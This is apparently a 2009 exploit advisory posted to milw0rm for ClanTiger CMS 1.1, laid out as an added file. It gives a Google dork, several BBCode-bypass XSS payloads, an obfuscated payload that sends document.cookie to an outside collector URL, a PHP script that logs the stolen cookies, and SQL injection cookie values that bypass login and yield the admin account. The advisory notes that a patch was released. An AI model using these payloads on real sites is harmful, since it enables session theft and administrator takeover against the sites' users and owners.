@@ -1,0 +1,200 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	  MULTIPLE COOKIES HANDLING VULNERABILITIES	            	     |
+|--------------------------------------------------------------------------------------------|
+|                         	     | CLAN TIGER CMS |		 			     |
+|  CMS INFORMATION:		      ----------------					     |
+|											     |
+|-->WEB: http://www.clantiger.com				   			     |
+|-->DOWNLOAD: http://www.clantiger.com/download-clan-cms 	   			     |
+|-->DEMO: http://www.demo.clantiger.com/						     |
+|-->CATEGORY: CMS / Portals								     |
+|-->DESCRIPTION: ClanTiger is a content management system specifically designed for gaiming  |
+| 		clans...			     					     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3.0.8 and IE 6.0.29 (Default)					     |
+|-->DORK: "Powered by ClanTiger"							     |
+|-->CATEGORY: BYPASS-BBCODE/COOKIES STEALING && COOKIE AUTH BYPASS/SQL INJECTION	     |
+|-->AFFECT VERSION: 1.1	(maybe <= ?)							     |
+|-->Discovered Bug date: 2009-04-04							     |
+|-->Reported Bug date: 2009-04-04							     |
+|-->Fixed bug date: 2009-04-06								     |
+|-->Info patch (v-1.1.1): http://www.clantiger.com/news-and-blog/			     |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+----------------------------------------------------------------------------------------------
+
+//////////////////////////////////
+
+COOKIES STEALING (BYPASS BBCODE)
+
+//////////////////////////////////
+
+(I fucked BBCode again...)
+
+-----------
+BUG ZONES:
+-----------
+
+#BBCode is bypassed by differents methods and XSS is posible.
+
+#We find BBCode on these links:
+
+http://[HOST]/[PATH]/index.php?module=news&action=view&id=2
+http://[HOST]/[PATH]/index.php?module=mycontrolpanel&action=signature
+http://[HOST]/[PATH]/index.php?module=news&action=view&id=2
+http://[HOST]/[PATH]/index.php?module=forum
+http://[HOST]/[PATH]/index.php?module=mymessages
+
+----------------------------------
+PROOF OF CONCEPT (SEARCHING XSS):
+----------------------------------
+
+BOTH (FIREFOX AND IE):
+
+[url][img]http://www.google.es onmouseover=alert(1) [/img][/url]
+[email][img]pepe@pepe.es onmouseover=alert(1) [/img][/email]
+[email][url]http://www.prueba.es onmouseover=alert(1) [/url][/email]
+[url][email]pepe@pepe.es onmouseover=alert(1) [/email][/url]
+
+...
+
+ONLY IE:
+
+[img][url]http://al.com onmouseover=alert(1) [/url][/img]
+[img][email]pepe@pepe.es onmouseover=alert(1) [/email][/img]
+
+...
+
+Combinations of tags: 
+
+[email][url]http://owned.com onmouseover=alert(1) [/url][/mail]
+
+Generate:
+
+<a href="mailto:<a href="http://owned.com onmouseover=alert(1) " target="_blank">http://owned.com onmouseover=alert(1) </a>"><a href="http://owned.com onmouseover=alert(1) " target="_blank">http://owned.com onmouseover=alert(1) </a></a>
+
+--------------------------
+COOKIES EXPLOIT (BBCODE):
+--------------------------
+
+Link --> http://www.myphpcookiestealing.es/capturethecookies.php?ck=
+
+[url][img]http://www.victim.es onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/url]
+
+------------------------------
+COOKIES STEALER (PHP SCRIPT):
+------------------------------
+
+<?php
+$ck=$_GET["ck"]; //Capture the cookies	 
+$manejador=fopen("exploited.txt",'a'); //Open cookies saved file
+fwrite($manejador, "Cookie:\r\n".htmlentities($ck)."\r\n--EOF--\r\n"); //Save the values
+fclose($manejador);	//Close file
+echo "<script>location.href='http://[HOST]/[PATH]/index.php?module';</script>"; //Redirect...we don't want to alert xDD
+?>
+
+Remember: You can use any cookie editor and you have one nice shot (XSSSHEll+XSSTunnel = many nice shots xD)
+
+///////////////////////////////////
+
+[COOKIE]AUTH BYPASS(SQL INJECTION)
+
+///////////////////////////////////
+
+But, my world isn't Only BBcode :P
+
+------------
+CONDITIONS:
+------------
+
+**(sometimes) DB_PREFIX="" (Default) 
+
+	maybe: db, db_clan, ...
+
+**gpc_magic_quotes=off
+
+-----------
+BUG FILE:
+-----------
+
+Path --> [HOME_PATH]/functions/class.accesscontrol.php
+
+It contents:
+
+	function checkLogin()
+	{
+		if($_COOKIE['CCC_UID'] && $_COOKIE['CCC_CODE'])
+		{
+			$uid = $_COOKIE['CCC_UID'];
+			$logincode = $_COOKIE['CCC_CODE'];
+			
+			$query = "SELECT * FROM " . DB_PREFIX . "members WHERE md5(id)='$uid' and logincode='$logincode'";
+			$results = $this->db->getrow($query);
+
+			if($results['username'])
+			{
+				
+				....
+			}	
+
+			
+		} 
+	}
+
+----------------------------------
+PROOF OF CONCEPT (SQL INJECTION):
+----------------------------------
+
+Add cookies:
+
+CCC_UID=BLABLABLA   //it is not use
+CCC_CODE=BLABLA' [SQL]
+
+---------
+EXAMPLE:
+---------
+
+Add cookies: (only need gpc_magic_quotes=off)
+
+CCC_UID=pepe	//it is not use
+CCC_CODE=lala' OR 1=1 /*	//admin 
+
+Other example: (DB_PREFIX="" and gpc_magic_quotes=off)
+
+CCC_UID=pepe	//it is not use
+CCC_CODE=lala' UNION ALL SELECT * FROM members WHERE id='1	//select first user= admin? maybe we want to be other (id=2,3,4...) :P
+
+*******************************************************************
+ ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+*******************************************************************
+-------------------------------------------------------------------
+*******************************************************************
+ GREETZ TO: JosS and all spanish Hack3Rs community!
+*******************************************************************
+
+-------------------EOF---------------------------------->>>ENJOY IT!
+
+# milw0rm.com [2009-04-17]
